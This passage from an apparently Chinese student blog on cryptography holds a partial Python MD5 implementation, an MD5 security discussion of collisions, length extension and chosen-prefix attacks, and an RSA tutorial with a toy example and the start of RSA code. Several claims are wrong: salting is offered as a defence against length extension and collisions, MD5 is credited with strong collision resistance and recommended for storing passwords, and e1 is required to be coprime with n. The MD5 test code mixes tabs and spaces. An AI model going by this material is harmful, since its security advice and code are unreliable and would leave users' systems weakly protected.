四个非线性函数,输入均为32bit的三个数据</span></span><br><span class=\"line\"><span class=\"comment\"># @input hex</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">F</span><span class=\"params\">(x, y, z)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x&amp;y) | (not_operate(x) &amp; z)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">G</span><span class=\"params\">(x,y,z)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x &amp; z) | (y &amp; not_operate(z))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">H</span><span class=\"params\">(x,y,z)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x ^ y ^ z)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">I</span><span class=\"params\">(x,y,z)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> y ^ (x | not_operate(z))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rotate_move</span><span class=\"params\">(x,n)</span>:</span></span><br><span class=\"line\">\tx = <span class=\"string\">f'<span class=\"subst\">&#123;bin(x)[<span class=\"number\">2</span>:]:<span class=\"number\">0</span>&gt;<span class=\"number\">32</span>&#125;</span>'</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> int(x[n:] + x[:n],<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># t[i]，返回10进制</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_t</span><span class=\"params\">(i)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> int(math.pow(<span class=\"number\">2</span>,<span class=\"number\">32</span>) * abs(math.sin(i)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># @input digital</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">FF</span><span class=\"params\">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class=\"line\">\t<span class=\"comment\"># m = int(m,2)</span></span><br><span class=\"line\">\tm = little_endian(int(m,<span class=\"number\">2</span>),<span class=\"number\">32</span>)</span><br><span class=\"line\">\tt = a + F(b,c,d) + m + Ti </span><br><span class=\"line\">\tt = t % (<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">\ta = (rotate_move(t,s) + b) % (<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">GG</span><span class=\"params\">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class=\"line\">\tm = little_endian(int(m,<span class=\"number\">2</span>),<span class=\"number\">32</span>)</span><br><span class=\"line\">\tt = a + G(b,c,d) + m + Ti </span><br><span class=\"line\">\tt = t % (<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">\ta = (rotate_move(t,s) + b) % (<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">HH</span><span class=\"params\">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class=\"line\">\tm = little_endian(int(m,<span class=\"number\">2</span>),<span class=\"number\">32</span>)</span><br><span class=\"line\">\tt = a + H(b,c,d) + m + Ti </span><br><span class=\"line\">\tt = t % (<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">\ta = (rotate_move(t,s) + b) % (<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">II</span><span class=\"params\">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class=\"line\">\tm = little_endian(int(m,<span class=\"number\">2</span>),<span class=\"number\">32</span>)</span><br><span class=\"line\">\tt = a + I(b,c,d) + m + Ti </span><br><span class=\"line\">\tt = t % (<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">\ta = (rotate_move(t,s) + b) % (<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">step_function</span><span class=\"params\">(M)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">global</span> A</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> B</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> C</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> D</span><br><span class=\"line\">\t<span class=\"comment\"># 复制前一分组的链接变量</span></span><br><span class=\"line\">\tAA = A</span><br><span class=\"line\">\tBB = B</span><br><span class=\"line\">\tCC = C</span><br><span class=\"line\">\tDD = D</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(M)):</span><br><span class=\"line\">\t\t<span class=\"comment\"># 第一轮循环</span></span><br><span class=\"line\">\t\tA = FF(A,B,C,D,M[i][<span class=\"number\">0</span>],<span class=\"number\">7</span>,get_t(<span class=\"number\">1</span>))</span><br><span class=\"line\">\t\tD = FF(D,A,B,C,M[i][<span class=\"number\">1</span>],<span class=\"number\">12</span>,get_t(<span class=\"number\">2</span>))</span><br><span class=\"line\">\t\tC = FF(C,D,A,B,M[i][<span class=\"number\">2</span>],<span class=\"number\">17</span>,get_t(<span class=\"number\">3</span>))</span><br><span class=\"line\">\t\tB = FF(B,C,D,A,M[i][<span class=\"number\">3</span>],<span class=\"number\">22</span>,get_t(<span class=\"number\">4</span>))</span><br><span class=\"line\">\t\tA = FF(A,B,C,D,M[i][<span class=\"number\">4</span>],<span class=\"number\">7</span>,get_t(<span class=\"number\">5</span>))</span><br><span class=\"line\">\t\tD = FF(D,A,B,C,M[i][<span class=\"number\">5</span>],<span class=\"number\">12</span>,get_t(<span class=\"number\">6</span>))</span><br><span class=\"line\">\t\tC = FF(C,D,A,B,M[i][<span class=\"number\">6</span>],<span class=\"number\">17</span>,get_t(<span class=\"number\">7</span>))</span><br><span class=\"line\">\t\tB = FF(B,C,D,A,M[i][<span class=\"number\">7</span>],<span class=\"number\">22</span>,get_t(<span class=\"number\">8</span>))</span><br><span class=\"line\">\t\tA = FF(A,B,C,D,M[i][<span class=\"number\">8</span>],<span class=\"number\">7</span>,get_t(<span class=\"number\">9</span>))</span><br><span class=\"line\">\t\tD = FF(D,A,B,C,M[i][<span class=\"number\">9</span>],<span class=\"number\">12</span>,get_t(<span class=\"number\">10</span>))</span><br><span class=\"line\">\t\tC = FF(C,D,A,B,M[i][<span class=\"number\">10</span>],<span class=\"number\">17</span>,get_t(<span class=\"number\">11</span>))</span><br><span class=\"line\">\t\tB = FF(B,C,D,A,M[i][<span class=\"number\">11</span>],<span class=\"number\">22</span>,get_t(<span class=\"number\">12</span>))</span><br><span class=\"line\">\t\tA = FF(A,B,C,D,M[i][<span class=\"number\">12</span>],<span class=\"number\">7</span>,get_t(<span class=\"number\">13</span>))</span><br><span class=\"line\">\t\tD = FF(D,A,B,C,M[i][<span class=\"number\">13</span>],<span class=\"number\">12</span>,get_t(<span class=\"number\">14</span>))</span><br><span class=\"line\">\t\tC = FF(C,D,A,B,M[i][<span class=\"number\">14</span>],<span class=\"number\">17</span>,get_t(<span class=\"number\">15</span>))</span><br><span class=\"line\">\t\tB = FF(B,C,D,A,M[i][<span class=\"number\">15</span>],<span class=\"number\">22</span>,get_t(<span class=\"number\">16</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\"># 第二轮循环</span></span><br><span class=\"line\">\t\tA = GG(A,B,C,D,M[i][<span class=\"number\">1</span>],<span class=\"number\">5</span>,get_t(<span class=\"number\">17</span>))</span><br><span class=\"line\">\t\tD = GG(D,A,B,C,M[i][<span class=\"number\">6</span>],<span class=\"number\">9</span>,get_t(<span class=\"number\">18</span>))</span><br><span class=\"line\">\t\tC = GG(C,D,A,B,M[i][<span class=\"number\">11</span>],<span class=\"number\">14</span>,get_t(<span class=\"number\">19</span>))</span><br><span class=\"line\">\t\tB = GG(B,C,D,A,M[i][<span class=\"number\">0</span>],<span class=\"number\">20</span>,get_t(<span class=\"number\">20</span>))</span><br><span class=\"line\">\t\tA = GG(A,B,C,D,M[i][<span class=\"number\">5</span>],<span class=\"number\">5</span>,get_t(<span class=\"number\">21</span>))</span><br><span class=\"line\">\t\tD = GG(D,A,B,C,M[i][<span class=\"number\">10</span>],<span class=\"number\">9</span>,get_t(<span class=\"number\">22</span>))</span><br><span class=\"line\">\t\tC = GG(C,D,A,B,M[i][<span class=\"number\">15</span>],<span class=\"number\">14</span>,get_t(<span class=\"number\">23</span>))</span><br><span class=\"line\">\t\tB = GG(B,C,D,A,M[i][<span class=\"number\">4</span>],<span class=\"number\">20</span>,get_t(<span class=\"number\">24</span>))</span><br><span class=\"line\">\t\tA = GG(A,B,C,D,M[i][<span class=\"number\">9</span>],<span class=\"number\">5</span>,get_t(<span class=\"number\">25</span>))</span><br><span class=\"line\">\t\tD = GG(D,A,B,C,M[i][<span class=\"number\">14</span>],<span class=\"number\">9</span>,get_t(<span class=\"number\">26</span>))</span><br><span class=\"line\">\t\tC = GG(C,D,A,B,M[i][<span class=\"number\">3</span>],<span class=\"number\">14</span>,get_t(<span class=\"number\">27</span>))</span><br><span class=\"line\">\t\tB = GG(B,C,D,A,M[i][<span class=\"number\">8</span>],<span class=\"number\">20</span>,get_t(<span class=\"number\">28</span>))</span><br><span class=\"line\">\t\tA = GG(A,B,C,D,M[i][<span class=\"number\">13</span>],<span class=\"number\">5</span>,get_t(<span class=\"number\">29</span>))</span><br><span class=\"line\">\t\tD = GG(D,A,B,C,M[i][<span class=\"number\">2</span>],<span class=\"number\">9</span>,get_t(<span class=\"number\">30</span>))</span><br><span class=\"line\">\t\tC = GG(C,D,A,B,M[i][<span class=\"number\">7</span>],<span class=\"number\">14</span>,get_t(<span class=\"number\">31</span>))</span><br><span class=\"line\">\t\tB = GG(B,C,D,A,M[i][<span class=\"number\">12</span>],<span class=\"number\">20</span>,get_t(<span class=\"number\">32</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\"># 第三轮循环</span></span><br><span class=\"line\">\t\tA = HH(A,B,C,D,M[i][<span class=\"number\">5</span>],<span class=\"number\">4</span>,get_t(<span class=\"number\">33</span>))</span><br><span class=\"line\">\t\tD = HH(D,A,B,C,M[i][<span class=\"number\">8</span>],<span class=\"number\">11</span>,get_t(<span class=\"number\">34</span>))</span><br><span class=\"line\">\t\tC = HH(C,D,A,B,M[i][<span class=\"number\">11</span>],<span class=\"number\">16</span>,get_t(<span class=\"number\">35</span>))</span><br><span class=\"line\">\t\tB = HH(B,C,D,A,M[i][<span class=\"number\">14</span>],<span class=\"number\">23</span>,get_t(<span class=\"number\">36</span>))</span><br><span class=\"line\">\t\tA = HH(A,B,C,D,M[i][<span class=\"number\">1</span>],<span class=\"number\">4</span>,get_t(<span class=\"number\">37</span>))</span><br><span class=\"line\">\t\tD = HH(D,A,B,C,M[i][<span class=\"number\">4</span>],<span class=\"number\">11</span>,get_t(<span class=\"number\">38</span>))</span><br><span class=\"line\">\t\tC = HH(C,D,A,B,M[i][<span class=\"number\">7</span>],<span class=\"number\">16</span>,get_t(<span class=\"number\">39</span>))</span><br><span class=\"line\">\t\tB = HH(B,C,D,A,M[i][<span class=\"number\">10</span>],<span class=\"number\">23</span>,get_t(<span class=\"number\">40</span>))</span><br><span class=\"line\">\t\tA = HH(A,B,C,D,M[i][<span class=\"number\">13</span>],<span class=\"number\">4</span>,get_t(<span class=\"number\">41</span>))</span><br><span class=\"line\">\t\tD = HH(D,A,B,C,M[i][<span class=\"number\">0</span>],<span class=\"number\">11</span>,get_t(<span class=\"number\">42</span>))</span><br><span class=\"line\">\t\tC = HH(C,D,A,B,M[i][<span class=\"number\">3</span>],<span class=\"number\">16</span>,get_t(<span class=\"number\">43</span>))</span><br><span class=\"line\">\t\tB = HH(B,C,D,A,M[i][<span class=\"number\">6</span>],<span class=\"number\">23</span>,get_t(<span class=\"number\">44</span>))</span><br><span class=\"line\">\t\tA = HH(A,B,C,D,M[i][<span class=\"number\">9</span>],<span class=\"number\">4</span>,get_t(<span class=\"number\">45</span>))</span><br><span class=\"line\">\t\tD = HH(D,A,B,C,M[i][<span class=\"number\">12</span>],<span class=\"number\">11</span>,get_t(<span class=\"number\">46</span>))</span><br><span class=\"line\">\t\tC = HH(C,D,A,B,M[i][<span class=\"number\">15</span>],<span class=\"number\">16</span>,get_t(<span class=\"number\">47</span>))</span><br><span class=\"line\">\t\tB = HH(B,C,D,A,M[i][<span class=\"number\">2</span>],<span class=\"number\">23</span>,get_t(<span class=\"number\">48</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\"># 第四轮循环</span></span><br><span class=\"line\">\t\tA = II(A,B,C,D,M[i][<span class=\"number\">0</span>],<span class=\"number\">6</span>,get_t(<span class=\"number\">49</span>))</span><br><span class=\"line\">\t\tD = II(D,A,B,C,M[i][<span class=\"number\">7</span>],<span class=\"number\">10</span>,get_t(<span class=\"number\">50</span>))</span><br><span class=\"line\">\t\tC = II(C,D,A,B,M[i][<span class=\"number\">14</span>],<span class=\"number\">15</span>,get_t(<span class=\"number\">51</span>))</span><br><span class=\"line\">\t\tB = II(B,C,D,A,M[i][<span class=\"number\">5</span>],<span class=\"number\">21</span>,get_t(<span class=\"number\">52</span>))</span><br><span class=\"line\">\t\tA = II(A,B,C,D,M[i][<span class=\"number\">12</span>],<span class=\"number\">6</span>,get_t(<span class=\"number\">53</span>))</span><br><span class=\"line\">\t\tD = II(D,A,B,C,M[i][<span class=\"number\">3</span>],<span class=\"number\">10</span>,get_t(<span class=\"number\">54</span>))</span><br><span class=\"line\">\t\tC = II(C,D,A,B,M[i][<span class=\"number\">10</span>],<span class=\"number\">15</span>,get_t(<span class=\"number\">55</span>))</span><br><span class=\"line\">\t\tB = II(B,C,D,A,M[i][<span class=\"number\">1</span>],<span class=\"number\">21</span>,get_t(<span class=\"number\">56</span>))</span><br><span class=\"line\">\t\tA = II(A,B,C,D,M[i][<span class=\"number\">8</span>],<span class=\"number\">6</span>,get_t(<span class=\"number\">57</span>))</span><br><span class=\"line\">\t\tD = II(D,A,B,C,M[i][<span class=\"number\">15</span>],<span class=\"number\">10</span>,get_t(<span class=\"number\">58</span>))</span><br><span class=\"line\">\t\tC = II(C,D,A,B,M[i][<span class=\"number\">6</span>],<span class=\"number\">15</span>,get_t(<span class=\"number\">59</span>))</span><br><span class=\"line\">\t\tB = II(B,C,D,A,M[i][<span class=\"number\">13</span>],<span class=\"number\">21</span>,get_t(<span class=\"number\">60</span>))</span><br><span class=\"line\">\t\tA = II(A,B,C,D,M[i][<span class=\"number\">4</span>],<span class=\"number\">6</span>,get_t(<span class=\"number\">61</span>))</span><br><span class=\"line\">\t\tD = II(D,A,B,C,M[i][<span class=\"number\">11</span>],<span class=\"number\">10</span>,get_t(<span class=\"number\">62</span>))</span><br><span class=\"line\">\t\tC = II(C,D,A,B,M[i][<span class=\"number\">2</span>],<span class=\"number\">15</span>,get_t(<span class=\"number\">63</span>))</span><br><span class=\"line\">\t\tB = II(B,C,D,A,M[i][<span class=\"number\">9</span>],<span class=\"number\">21</span>,get_t(<span class=\"number\">64</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tA = (AA + A) % <span class=\"number\">2</span>**<span class=\"number\">32</span></span><br><span class=\"line\">\t\tB = (BB + B) % <span class=\"number\">2</span>**<span class=\"number\">32</span></span><br><span class=\"line\">\t\tC = (CC + C) % <span class=\"number\">2</span>**<span class=\"number\">32</span></span><br><span class=\"line\">\t\tD = (DD + D) % <span class=\"number\">2</span>**<span class=\"number\">32</span></span><br><span class=\"line\">\t\tAA = A</span><br><span class=\"line\">\t\tBB = B</span><br><span class=\"line\">\t\tCC = C</span><br><span class=\"line\">\t\tDD = D</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span><span class=\"params\">(word)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">global</span> A,B,C,D</span><br><span class=\"line\">\t<span class=\"comment\"># 初始化链接向量</span></span><br><span class=\"line\">\tA = <span class=\"number\">0x67452301</span></span><br><span class=\"line\">\tB = <span class=\"number\">0xEFCDAB89</span></span><br><span class=\"line\">\tC = <span class=\"number\">0x98BADCFE</span></span><br><span class=\"line\">\tD = <span class=\"number\">0x10325476</span></span><br><span class=\"line\">\tbintext = additonal_filling(word)</span><br><span class=\"line\">\tbdata = bintext</span><br><span class=\"line\">\tgroup_mess = [[]*<span class=\"number\">16</span>] <span class=\"comment\"># 分组消息数组</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">\t\tgroup_mess[<span class=\"number\">0</span>].append(<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(bdata)//<span class=\"number\">512</span>):</span><br><span class=\"line\">\t\ttemp = bdata[i*<span class=\"number\">512</span>:i*<span class=\"number\">512</span>+<span class=\"number\">512</span>]</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">\t\t\tgroup_mess[<span class=\"number\">0</span>][j] = temp[j*<span class=\"number\">32</span>:j*<span class=\"number\">32</span>+<span class=\"number\">32</span>]</span><br><span class=\"line\">\t\tstep_function(group_mess)</span><br><span class=\"line\">\tA = hex(A)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">\tB = hex(B)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">\tC = hex(C)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">\tD = hex(D)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">\t<span class=\"comment\"># 按小端字节序级联输出</span></span><br><span class=\"line\">\tout = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> (A,B,C,D):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>//<span class=\"number\">2</span>):</span><br><span class=\"line\">\t\t\tout += item[(<span class=\"number\">3</span>-i)*<span class=\"number\">2</span>:(<span class=\"number\">3</span>-i)*<span class=\"number\">2</span>+<span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> out</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">\tword1 = <span class=\"string\">\"iscbupt\"</span></span><br><span class=\"line\">\tword2 = <span class=\"string\">\"Beijing University of Posts and TelecommunicationsBeijing University of Posts and Telecommunications\"</span></span><br><span class=\"line\">\tword3 = <span class=\"string\">\"State Key Laboratory of Networking and Switching\"</span></span><br><span class=\"line\">\tword4 = <span class=\"string\">\"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!\"</span></span><br><span class=\"line\">\tprint(word1)</span><br><span class=\"line\">    print(encrypt(word1))</span><br><span class=\"line\">    print(word2)</span><br><span class=\"line\">\tprint(encrypt(word2))</span><br></pre></td></tr></table></figure>\n<p><strong>实例演示：</strong></p>\n<p><img src=\"/2019/01/15/crypto2/2.png\" alt=\"demo\"></p>\n<p><strong>安全性分析</strong></p>\n<p>​    MD5算法是一种哈希算法，所以对于MD5算法的安全问题主要在于它是否具有足够的抗碰撞性。</p>\n<p>​    在碰撞攻击方面，王小云教授研究很深入，她的成果集中在加速构造碰撞对。原来理论上构造出一个MD5碰撞对需要2^64次尝试，而现在只需要2^39次，其算法大大加速了这一过程。但从应用场景上来看，它本身并不具备太多的应用价值，因为构造出的碰撞很可能毫无意义。它的价值在于，<strong>在此算法基础上衍生出来的一系列MD5的算法，能够在部分场景下，构造出一个有意义的伪造信息，并且MD5值保持不变。</strong>所以，单单看这个算法本身就说MD5不安全，有些夸大其实。但是，后续的那些算法出现之后，MD5的安全性就真的有些令人担忧了，也就是下文要说的两种算法。 </p>\n<ul>\n<li><p>哈希长度扩展攻击，具体细节可以参考大牛道哥的博文 <a href=\"http://blog.chinaunix.net/uid-27070210-id-3255947.html\" target=\"_blank\" rel=\"noopener\">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a>，简单说来就是在已知输入M的长度（注意是长度）和其MD5值的情况下，可以在原文M后面附加任意内容，同时能够推算出新的MD5。在某些将MD5作为签名手段的系统中，攻击者可以在原文M后面随意添加内容同时能够提供正确的MD5值。 在校学习平台上就有类似的题目</p>\n<p>存在这一问题的原因是算法使用了Merkle–Damgård construction进行数据的压缩，不止MD5，很多流行的算法都存在这个问题，比如SHA1。 </p>\n</li>\n<li><p>特定前缀攻击。两个不同的exe程序会在屏幕上打出不同的字符，但是他们的MD5值确是相同的，exe程序下载地址如下 <a href=\"https://www.cnblogs.com/A2008A/archive/2012/08/10/2631840.html\" target=\"_blank\" rel=\"noopener\">link</a>，专家还给出了MD5碰撞快读生成器。</p>\n</li>\n</ul>\n<p>面对这两个攻击，一个提高MD5安全性的有效手段是 <strong>加盐（每一个口令同一个叫做”盐“（salt）的n位随机数相关联 ）</strong>。</p>\n<p><strong>实用性分析：</strong></p>\n<p>​    即使MD5现在已经被证明不是百分百安全的，但是被攻破只是有限情况下的个例，对于大多数安全性要求不是很高的应用中，MD5依然拥有广泛的使用空间。MD5具有压缩性，容易计算，抗修改性和强抗碰撞性等特点，在实际应用中，其结果方便存储，在对文件加密上有很大的优势（只需要32位字符串就能对一个巨大的文件进行验证完整性 ），且加密损耗低，对性能要求较低，计算迅速。由于其不可逆的特性，在实际应用中可以用来用户密码，请求参数校验，文件校验等用途。</p>\n<h1 id=\"公钥密码\"><a href=\"#公钥密码\" class=\"headerlink\" title=\"公钥密码\"></a>公钥密码</h1><h2 id=\"RSA公钥加密体制\"><a href=\"#RSA公钥加密体制\" class=\"headerlink\" title=\"RSA公钥加密体制\"></a>RSA公钥加密体制</h2><p>​    RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种<em>非对称加密算法</em>。RSA是目前最重要的网络加密算法。</p>\n<p>算法原理：</p>\n<blockquote>\n<p>RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难</p>\n</blockquote>\n<p>​    第一步</p>\n<blockquote>\n<p>选定两个质数p、q，实际应用中这两个数越大安全性越高。</p>\n</blockquote>\n<p>​    第二步</p>\n<blockquote>\n<p>计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是<em>密钥长度</em>，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。</p>\n</blockquote>\n<p>​    第三步</p>\n<blockquote>\n<p>计算n的 <em>欧拉函数</em> φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表</p>\n</blockquote>\n<p>​    第四步</p>\n<blockquote>\n<p> 随机选定一个数e1，要求1 &lt; e1 &lt; φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击<a href=\"https://baike.baidu.com/item/%E4%BA%92%E8%B4%A8\" target=\"_blank\" rel=\"noopener\">这里</a></p>\n</blockquote>\n<p>​    第五步</p>\n<blockquote>\n<p>寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用<em>扩展欧几里得算法</em> 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。</p>\n</blockquote>\n<p>​    第六步</p>\n<blockquote>\n<p>封装<em>（n，e1）</em>为<em>公钥</em> ，<em>（n，e2）</em>为<em>私钥</em>。</p>\n</blockquote>\n<p>​    至此，所有准备工作完成。</p>\n<p>​    加密和解密</p>\n<blockquote>\n<p> 先介绍一下加解密的公式，假定明文为A，那么，<br> 密文B≡A^e1 mod n，要传输给对方的就是B<br> 对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。</p>\n</blockquote>\n<p>​    假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(<em>^▽^</em>)。</p>\n<blockquote>\n<p> 假定要传输的明文为： 32<br>  注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode      编码传输。</p>\n</blockquote>\n<p>​    加密</p>\n<blockquote>\n<p>A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密</p>\n</blockquote>\n<p>​    解密</p>\n<blockquote>\n<p>A = B^e2 mod n = 32 ，成功得到明文32！</p>\n</blockquote>\n<p>简单证明一下上述算法的正确性：</p>\n<p> <em>欧拉定理</em> </p>\n<blockquote>\n<p>若n,a为正整数，且n,a互质，则<br>$a^{φ(n)} ≡ 1 （mod \\; n）$ </p>\n</blockquote>\n<p>​    φ（n）为 <em>欧拉函数</em> ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质</p>\n<blockquote>\n<p>如果n可以分解为两个互质的整数p、q的乘积，那么有<br>φ（n）= (p-1) * (q-1)</p>\n</blockquote>\n<p>​    接下来要证明的就是为什么下面两个式子可以互换实现</p>\n<blockquote>\n<p>B=A^e1   mod n<br>A=B^e2   mod n</p>\n</blockquote>\n<p>​    解密规则为</p>\n<blockquote>\n<p>A=B^e2 mod n</p>\n</blockquote>\n<p>​    根据加密规则</p>\n<blockquote>\n<p>B = A^e1 mod n<br>B = A^e1 - kn</p>\n</blockquote>\n<p>​    代入解密式中</p>\n<blockquote>\n<p>(A^e1 - kn)^e2 ≡ A （mod n）</p>\n</blockquote>\n<p>​    等于证</p>\n<blockquote>\n<p>$A^{e1*e2} ≡ m （mod \\; n）$</p>\n</blockquote>\n<p>​<br>由 <em>欧拉定理</em> 可以得到</p>\n<blockquote>\n<p>e1&#42;e2 ≡ 1  [ mod φ（n）]<br>e1&#42;e2 ≡ hφ（n）+1</p>\n</blockquote>\n<p>​    代入前面的式子可以得到</p>\n<blockquote>\n<p>$A^{hφ（n）+1} \\; ≡ m (mod\\;n)$</p>\n</blockquote>\n<p>​    上式恒成立，则算法正确性得证。</p>\n<p><strong>代码如下：</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2 <span class=\"keyword\">as</span> gp</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 字符串转为2进制</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2bin</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">\ttext = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">\t\ttext += <span class=\"string\">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class=\"number\">2</span>:])</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bin2str</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">\ttext = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(s)//<span class=\"number\">8</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> int(s[i*<span class=\"number\">8</span>:i*<span class=\"number\">8</span>+<span class=\"number\">8</span>], <span class=\"number\">2</span>) == <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t\ttext += chr(int(s[i*<span class=\"number\">8</span>:i*<span class=\"number\">8</span>+<span class=\"number\">8</span>], <span class=\"number\">2</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fastExpMod</span><span class=\"params\">(b, e, m)</span>:</span></span><br><span class=\"line\">    result = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> e != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (e&amp;<span class=\"number\">1</span>) == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"comment\"># ei = 1, then mul</span></span><br><span class=\"line\">            result = (result * b) % m</span><br><span class=\"line\">        e 